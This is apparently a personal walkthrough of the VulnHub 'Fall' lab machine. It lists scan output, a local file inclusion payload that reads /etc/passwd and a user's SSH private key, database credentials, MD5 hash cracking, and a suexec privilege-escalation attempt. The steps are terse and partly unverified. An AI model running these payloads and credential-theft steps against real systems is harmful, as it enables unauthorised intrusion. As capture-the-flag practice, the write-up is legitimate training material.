```http
https://www.vulnhub.com/entry/digitalworldlocal-fall,726/
```
# Description

> [!NOTE]
> To celebrate the fifth year that the author has survived his infosec career, a new box has been born! This machine resembles a few different machines in the PEN-200 environment (making it yet another OSCP-like box). More enumeration practice indeed! If you MUST have hints for this machine: FALL is (#1): what happens when one gets careless, (#2): important in making sure we can get up, (#3): the author's favourite season since it is a season of harvest.

```ip
192.168.3.189
```
___
# Recon
## Nmap
```bash
sudo nmap -p- -sC -sV -Pn 192.168.3.189 -T5 -vv
```

```resoults
PORT      STATE  SERVICE     REASON         VERSION
22/tcp    open   ssh         syn-ack ttl 64 OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBezJ/KDio6Fwya44wrK4/39Vd93TBRE3CC7En4GJYCcT89paKDGhozzWU7pAFV5FqWbBZ5Z9pJIGhVNvmIIYR1YoyTbkF3qbf41XBGCmI87nLqYxFXQys3iycBYah3qMxkr24N4SvU+OIOWItFQZSNCK3BzYlCnxFNVNh4JLqrI/Og40EP5Ck7REorRRIraefdROKDqZHPeugwV1UHbISjyDsKChbpobQxVl80RT1dszhuUU1BvhJl1sy/opLQWdRjsl97L1c0lc87AFcd6PgsGf6UFURN+1RaVngnZBFWWnYUb/HfCbKJGseTgATk+Fk5+IBOrlXJ4fQ9/SkagXL
|   256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFLZltNl1U6p8d7Su4gH+FQmIRRpZlAuOHrQYHYdGeWADfzBXlPSDkCrItb9doE6+ACyru5Fm023LgiTNg8yGU=
|   256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEeQTBvJOPKDtUv+nJyQJ9rKdAmrC577XXaTjRI+2n3c
80/tcp    open   http        syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-title: Good Tech Inc's Fall Sales - Home
111/tcp   closed rpcbind     reset ttl 64
139/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| tls-alpn: 
|_  http/1.1
|_http-title: Good Tech Inc's Fall Sales - Home
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-2683772458131447713
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-08-15T03:51:33
| Not valid after:  2020-08-19T05:31:33
| MD5:   ac51:22da:893a:4d95:07ba:3e82:5780:bf24
| SHA-1: 8821:fdc6:7f1b:ac6a:2c7b:6a32:194d:ed44:b553:2cf4
| -----BEGIN CERTIFICATE-----
| MIIE4DCCAsigAwIBAgIIV5TaF3XKfxowDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV
| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMjY4Mzc3
| MjQ1ODEzMTQ0NzcxMzEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0xOTA4
| MTUwMzUxMzNaFw0yMDA4MTkwNTMxMzNaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK
| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw
| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKY2vdPnY38fq4HuMzEIZwz2PfMutxbg
| xdxMBJMk8eM9vwwMmDyiMuEMfy46w5gvCgo5zmq4VoQYKJxrcUIogiDqzLC/Pjfq
| jSvFooDih5naltrhaoZvTHlu8Q4G0TmwhaaYpedqkhPzVLHywkckVBu9P9unrrlI
| BI3+N3aZLTppsk1gTe67tUjhpeiMQKkYWhtgTG3upSAI9FjsB9LNhw8CyIM+VFHj
| 2YHFlvp+Jt1A+u+vMtfDm5A86/MpdeWpLKbLTjgNk0Q79VPU0UBnoSKcS2RwAVRM
| QkR3lLoOEGu/DLz84EQP1r9m5jLZX5p5Gc0qaa9/FG3ll9DLRL+gggsCAwEAAaNg
| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo
| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFNch7n7MGaSjmr7qLPAGmH5iWQnd
| MA0GCSqGSIb3DQEBCwUAA4ICAQBxLU3j7e5B47e3oO7dHrZrl6fTxAPORYcPWM19
| Qjwq4wBluFliGz918zGukOrDQdb2WEhbJj1X2SNsLhqa6i/nEi+GKQ7XzMwpOxTg
| vY3bFV1y550Uac/kj6lSXLIgRllLruuQOOLHsfz9BhTe5ZbSO0N20XhvHqhxbd6s
| EBqKZeSbnweXnHUeiev/7IceZaxoWHqJ4CfM1PUXnJZL+NuWGPAfzMfv5F7ap66T
| d1bc9xBvg9jbvP4RtmGT0QwpUTCpsXBLS3WuZjq9/jcxvyubwVfIidGCMGoiGNqy
| pHI+XgYH3f/9W56QgxuUIjctLTeU8v5YZlS7vw58whxaZ0j3xQd50RZ+YFPTXnsy
| L2oAOZ8Lb57SKMM/RKYju5cvSQjtTRz+KnHqZHwDA46b2WKOUONrlNvm7Hp0dICB
| RLfD150FOj8L914sNFh85M2Sj1BFHKDSNu9ootIZg0uUxwJNGrOuzY0vlRiAJTOA
| Sw3FNGWb1UWyAXjO1DGL2YEnW2phXMdml4MttR6HoDgw689ra0q67xNWRyNOEc00
| OdANMqq4PpF3W58/o8zRriePTQiGYltb95DUS5skFm/ScJ9PvElefLn5MkgnhKEC
| htGW8shfB4Rhc9r+03JJpflvJ48EtS/TikQNTyO4B9p1bEguRVbWzx6Tf/rLEYdb
| GBMBjA==
|_-----END CERTIFICATE-----
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_ssl-date: TLS randomness does not represent time
445/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp  open   mysql       syn-ack ttl 64 MySQL (unauthorized)
8000/tcp  closed http-alt    reset ttl 64
8080/tcp  closed http-proxy  reset ttl 64
8443/tcp  closed https-alt   reset ttl 64
9090/tcp  open   http        syn-ack ttl 64 Cockpit web service 162 - 188
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.3.189:9090/
10080/tcp closed amanda      reset ttl 64
10443/tcp closed cirrossp    reset ttl 64
MAC Address: 08:00:27:6A:59:3F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   Computer name: fall
|   NetBIOS computer name: FALL\x00
|   Domain name: \x00
|   FQDN: fall
|_  System time: 2025-05-17T20:49:17-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13026/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42896/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56099/udp): CLEAN (Timeout)
|   Check 4 (port 9941/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h20m03s, deviation: 4h02m30s, median: 3s
| smb2-time: 
|   date: 2025-05-18T03:49:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
___
# WEB

> [!NOTE]
> 80/tcp    open   http        syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
> ~~443/tcp   open   ssl/http    syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips~~ 
> 9090/tcp  open   http        syn-ack ttl 64 Cockpit web service 162 - 188

```
dirsearch -u http://192.168.3.189/
```

```bash
200 -    4KB - /admin/login.php
200 -    2KB - /assets/
200 -    0B  - /config.php
200 -   24B  - /doc/
200 -   24B  - /lib/
200 -    3KB - /modules/
200 -   79B  - /robots.txt
```

```http
http://192.168.3.189/robots.txt
```
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518070331.png)

```http
http://192.168.3.189/test.php
```
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518071100.png)

```Creds>>>
Usernames:
qiu
```


```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FFUZ -u http://192.168.3.189/test.php?FFUZ=id -ic -c -fs 80
```


## LFI
```http
http://192.168.3.189/test.php?file=../../../../etc/passwd
```

```users
root:x:0:0:root:/root:/bin/bash
qiu:x:1000:1000:qiu:/home/qiu:/bin/bashe
```

CONFIG INFO TO CMS
```http
https://www.novelsite.ru/gde-dostup-basa-dannyh-cms-config.html
```

SSH
```http
http://192.168.3.189/test.php?file=../../../../../home/qiu/.ssh/id_rsa
```

## Searchsploit

> [!warning]
> CMS Made Simple version 2.2.15

```http
https://www.exploit-db.com/exploits/49345
```
___


```http
https://192.168.3.189:9090/
```

![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518065624.png)

# SSH

> [!NOTE]
> 22/tcp    open   ssh         syn-ack ttl 64 OpenSSH 7.8 (protocol 2.0)

```bash
ssh -i key qiu@192.168.3.189
```

![[20250518072622.png]]

```bash
cat /var/www/html/config.php
```

```config
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Asia/Singapore';
$config['db_port'] = 3306;
```

## MYSQL
```bash
mysql -u cms_user -p
```

```
P@ssw0rdINSANITY
```

```
use datebeses;
SHOW TABLES;
SELECT * FROM cms_users;
```

```
qiu:bc8b9059c13582d649d3d9e48c16d67f
patrick:6aea70cc6a678f0f83a82e1c753d7764
```

# hashcat
```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt 
```
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518074258.png)

```bash
hashcat -h | grep "MD5"
hashcat -m 0 hash /usr/share/wordlists/seclists/Passwords/*.txt  
PASS
cmsimple
admin123
```



## Linpeas                                                                                                   
___
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518075841.png)
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518080104.png)
___
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518075826.png)
```bash
ls -la /var/lib/cockpit/
n/a
```
___
```
Files with capabilities (limited to 50):
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/mtr-packet = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
```

```
echo "/bin/bash -p" > /tmp/shell
chmod +x /tmp/shell
/usr/sbin/suexec root root /tmp/shell  
```
___
# Bash History


![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518082351.png)
![digitalworldlocal-fall](https://raw.githubusercontent.com/GooseGusevich/vulnhub/refs/heads/main/digitalworldlocal-fall/screenshots/20250518082633.png)